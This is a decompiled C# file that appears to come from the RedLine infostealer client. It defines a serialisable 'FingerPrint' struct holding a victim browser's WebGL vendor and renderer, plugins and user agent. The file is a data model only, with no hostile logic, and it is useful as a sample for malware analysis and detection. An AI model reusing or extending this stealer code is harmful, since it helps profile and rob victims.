using System;
using System.Runtime.Serialization;

namespace RedLine.Client.Models
{
	// Token: 0x0200003A RID: 58
	[DataContract(Name = "FingerPrint", Namespace = "v1/Models")]
	public struct FingerPrint
	{
		// Token: 0x17000097 RID: 151
		// (get) Token: 0x0600017D RID: 381 RVA: 0x0000499E File Offset: 0x00002B9E
		// (set) Token: 0x0600017E RID: 382 RVA: 0x000049A6 File Offset: 0x00002BA6
		[DataMember(Name = "WebBaseGlVersion")]
		public string WebBaseGlVersion { get; set; }

		// Token: 0x17000098 RID: 152
		// (get) Token: 0x0600017F RID: 383 RVA: 0x000049AF File Offset: 0x00002BAF
		// (set) Token: 0x06000180 RID: 384 RVA: 0x000049B7 File Offset: 0x00002BB7
		[DataMember(Name = "WebBaseGlRenderer")]
		public string WebBaseGlRenderer { get; set; }

		// Token: 0x17000099 RID: 153
		// (get) Token: 0x06000181 RID: 385 RVA: 0x000049C0 File Offset: 0x00002BC0
		// (set) Token: 0x06000182 RID: 386 RVA: 0x000049C8 File Offset: 0x00002BC8
		[DataMember(Name = "WebBaseGlVendor")]
		public string WebBaseGlVendor { get; set; }

		// Token: 0x1700009A RID: 154
		// (get) Token: 0x06000183 RID: 387 RVA: 0x000049D1 File Offset: 0x00002BD1
		// (set) Token: 0x06000184 RID: 388 RVA: 0x000049D9 File Offset: 0x00002BD9
		[DataMember(Name = "WebDebugGlVendor")]
		public string WebDebugGlVendor { get; set; }

		// Token: 0x1700009B RID: 155
		// (get) Token: 0x06000185 RID: 389 RVA: 0x000049E2 File Offset: 0x00002BE2
		// (set) Token: 0x06000186 RID: 390 RVA: 0x000049EA File Offset: 0x00002BEA
		[DataMember(Name = "WebDebugGlRenderer")]
		public string WebDebugGlRenderer { get; set; }

		// Token: 0x1700009C RID: 156
		// (get) Token: 0x06000187 RID: 391 RVA: 0x000049F3 File Offset: 0x00002BF3
		// (set) Token: 0x06000188 RID: 392 RVA: 0x000049FB File Offset: 0x00002BFB
		[DataMember(Name = "Plugins")]
		public string Plugins { get; set; }

		// Token: 0x1700009D RID: 157
		// (get) Token: 0x06000189 RID: 393 RVA: 0x00004A04 File Offset: 0x00002C04
		// (set) Token: 0x0600018A RID: 394 RVA: 0x00004A0C File Offset: 0x00002C0C
		[DataMember(Name = "UserAgent")]
		public string UserAgent { get; set; }
	}
}
